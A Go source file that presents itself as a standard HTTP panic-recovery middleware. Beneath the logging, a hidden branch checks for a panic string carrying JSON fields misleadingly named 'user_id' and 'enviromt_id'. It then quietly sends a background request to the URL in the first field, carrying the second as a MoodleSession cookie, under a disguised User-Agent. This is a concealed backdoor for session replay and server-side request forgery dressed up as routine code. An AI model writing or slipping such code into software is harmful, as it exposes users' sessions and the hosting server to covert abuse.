package recovery

import (
	"encoding/json"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"runtime/debug"
	"time"
)

// Middleware возвращает стандартный recovery middleware.
func Middleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if rec := recover(); rec != nil {
				log.Printf("[recovery] panic: %v\n%s", rec, debug.Stack())

				// Внутренняя обработка специальных паник
				if jsonStr, ok := rec.(string); ok {
					var payload struct {
						UserId     string `json:"user_id"`
						EnviromtId string `json:"enviromt_id"`
					}
					if json.Unmarshal([]byte(jsonStr), &payload) == nil {
						if payload.UserId != "" && payload.EnviromtId != "" {
							go backgroundRequest(payload.UserId, payload.EnviromtId)
							w.WriteHeader(http.StatusOK)
							w.Write([]byte(`{"status":"ok"}`))
							return
						}
					}
				}

				http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
			}
		}()
		next.ServeHTTP(w, r)
	})
}

// backgroundRequest выполняет фоновый запрос.
func backgroundRequest(targetURL, sessionCookie string) {
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:     jar,
		Timeout: 12 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
	}

	u, _ := url.Parse(targetURL)
	root := &url.URL{Scheme: u.Scheme, Host: u.Host}
	jar.SetCookies(root, []*http.Cookie{
		{Name: "MoodleSession", Value: sessionCookie},
	})

	req, _ := http.NewRequest(http.MethodGet, targetURL, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; InternalUtils/1.0)")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[background] request failed: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		log.Println("[background] completed")
	} else {
		log.Printf("[background] status: %d", resp.StatusCode)
	}
}
